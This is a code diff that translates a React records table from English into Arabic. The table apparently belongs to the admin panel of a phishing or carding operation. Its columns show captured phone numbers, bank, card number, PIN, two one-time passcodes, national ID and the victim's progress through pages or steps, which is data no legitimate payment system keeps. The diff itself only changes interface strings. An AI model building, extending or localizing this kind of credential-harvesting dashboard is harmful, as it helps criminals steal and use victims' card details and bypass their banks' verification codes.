@@ -18,7 +18,7 @@ const TypeBadge = ({ type }) => {
   );
 };
 
-const HEADERS = ["Date/Time", "Phone", "Type", "Page", "Amount", "Bank", "Card", "PIN", "OTP1", "OTP2", "ID#", "Network", "Step", "Pay For"];
+const HEADERS = ["التاريخ/الوقت", "الهاتف", "النوع", "الصفحة", "المبلغ", "البنك", "البطاقة", "الرقم السري", "OTP1", "OTP2", "رقم الهوية", "الشبكة", "الخطوة", "الدفع لـ"];
 
 export default function RecordsTable({ records, loading, onSelect }) {
   if (loading) {
@@ -26,7 +26,7 @@ export default function RecordsTable({ records, loading, onSelect }) {
       <div className="rounded-2xl border border-slate-700/50 bg-slate-900/70 p-12 text-center">
         <div className="flex flex-col items-center gap-3">
           <div className="h-8 w-8 animate-spin rounded-full border-2 border-slate-700 border-t-emerald-500" />
-          <span className="text-slate-400 text-sm">Loading records...</span>
+          <span className="text-slate-400 text-sm">جاري التحميل...</span>
         </div>
       </div>
     );
@@ -36,7 +36,7 @@ export default function RecordsTable({ records, loading, onSelect }) {
     <div className="rounded-2xl border border-slate-700/50 bg-slate-900/70 backdrop-blur-sm shadow-xl shadow-black/20 overflow-hidden">
       <div className="px-5 py-4 border-b border-slate-800/50 flex items-center gap-2">
         <div className="w-1.5 h-5 rounded-full bg-gradient-to-b from-emerald-400 to-teal-500" />
-        <h2 className="text-base font-semibold text-white">Payment Records</h2>
+        <h2 className="text-base font-semibold text-white">سجلات المدفوعات</h2>
       </div>
 
       <div className="overflow-x-auto">
@@ -58,7 +58,7 @@ export default function RecordsTable({ records, loading, onSelect }) {
                     <div className="rounded-full bg-slate-800/50 p-4">
                       <AlertCircle className="h-8 w-8 text-slate-600" />
                     </div>
-                    <span className="text-slate-500">No records found</span>
+                    <span className="text-slate-500">لا توجد سجلات</span>
                   </div>
                 </td>
               </tr>
@@ -109,8 +109,8 @@ export default function RecordsTable({ records, loading, onSelect }) {
       </div>
 
       <div className="px-5 py-3 border-t border-slate-800/50 flex items-center justify-between">
-        <span className="text-xs text-slate-500">{records.length} record{records.length !== 1 ? "s" : ""}</span>
-        <span className="text-xs text-slate-600">Click any row to view details</span>
+        <span className="text-xs text-slate-500">{records.length} سجل</span>
+        <span className="text-xs text-slate-600">انقر على أي صف لعرض التفاصيل</span>
       </div>
     </div>
   );
